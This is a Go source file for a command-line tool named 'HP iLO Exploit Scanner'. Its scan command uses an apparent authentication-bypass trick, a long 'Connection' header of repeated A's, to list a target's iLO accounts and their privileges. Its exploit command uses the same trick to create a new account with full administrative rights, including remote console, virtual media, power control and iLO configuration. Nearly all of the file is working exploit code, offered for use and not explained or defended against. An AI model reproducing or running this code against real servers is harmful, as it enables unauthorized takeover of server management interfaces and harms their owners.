package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"

	"gopkg.in/alecthomas/kingpin.v2"
)

var (
	app = kingpin.New(os.Args[0], "HP iLO Exploit Scanner")

	t      = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client = &http.Client{Transport: t}

	addr  = ""
	user  = ""
	pw    = ""
	magic = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" //A*29
)

func main() {
	app.GetFlag("help").Short('h')

	// commands
	scan := app.Command("scan", "iLO Vulnerability Scanner")
	scan.Arg("Address", "The Address to scan").Required().StringVar(&addr)
	scan.Action(iloScan)

	exploit := app.Command("exploit", "iLO Vunerability Exploiter")
	exploit.Arg("Address", "The Address to exploit").Required().StringVar(&addr)
	exploit.Arg("Username", "New account username").Required().StringVar(&user)
	exploit.Arg("Password", "New account password").Required().StringVar(&pw)
	exploit.Action(iloExploit)

	// Parse and execute
	_, err := app.Parse(os.Args[1:])
	if err != nil {
		kingpin.Fatalf("%v\n", err)
	}
}

func iloScan(_ *kingpin.ParseContext) error {
	accounts := Accounts{}
	req, err := http.NewRequest("GET",
		fmt.Sprintf("https://%s/rest/v1/AccountService/Accounts", addr),
		nil,
	)

	if err != nil {
		fmt.Print(err)
	}

	req.Header.Add("Connection", magic)

	response, err := client.Do(req)
	if err != nil {
		fmt.Print(err)
	}

	// If we don't get a HTTP 200 resp
	if response.StatusCode == 401 {
		fmt.Printf("[+] %s is not vulnerable\n", addr)
		return nil
	}

	fmt.Printf("[+] %s is VULNERABLE\n", addr)
	fmt.Printf("[+] Printing account information:\n")
	b, _ := ioutil.ReadAll(response.Body)

	if err := json.Unmarshal(b, &accounts); err != nil {
		fmt.Print(err)
	}

	for _, account := range accounts.Accounts {
		fmt.Printf("[+] Username: %s\n", account.UserName)
		fmt.Printf("\tID: %v\n", account.Id)
		fmt.Printf("\tType: %v\n", account.Type)
		fmt.Print("\tPrivileges\n")
		fmt.Printf("\t\tLogin: %t\n", account.Oem.Hp.Privileges.LoginPriv)
		fmt.Printf("\t\tRemote Console: %t\n", account.Oem.Hp.Privileges.RemoteConsolePriv)
		fmt.Printf("\t\tUser Config: %t\n", account.Oem.Hp.Privileges.UserConfigPriv)
		fmt.Printf("\t\tVirtual Media: %t\n", account.Oem.Hp.Privileges.VirtualMediaPriv)
		fmt.Printf("\t\tVirtual Power And Reset: %t\n", account.Oem.Hp.Privileges.VirtualPowerAndResetPriv)
		fmt.Printf("\t\tiLO Config: %t\n", account.Oem.Hp.Privileges.ILOConfigPriv)
	}

	return nil
}

func iloExploit(_ *kingpin.ParseContext) error {
	body := Account{
		UserName: user,
		Password: pw,
		Oem: Oem{
			Hp: Hp{
				LoginName: user,
				Privileges: Privileges{
					LoginPriv:                true,
					RemoteConsolePriv:        true,
					UserConfigPriv:           true,
					VirtualMediaPriv:         true,
					VirtualPowerAndResetPriv: true,
					ILOConfigPriv:            true,
				},
			},
		},
	}

	b, err := json.Marshal(body)
	if err != nil {
		fmt.Print(err)
	}

	req, err := http.NewRequest("POST",
		fmt.Sprintf("https://%s/rest/v1/AccountService/Accounts", addr),
		bytes.NewBuffer(b),
	)
	if err != nil {
		fmt.Print(err)
	}

	req.Header.Add("Connection", magic)
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Accept-Encoding", "gzip, deflate")

	response, err := client.Do(req)
	if err != nil {
		fmt.Print(err)
	}

	rb, _ := ioutil.ReadAll(response.Body)
	fmt.Printf("%s\n", rb)

	return nil
}
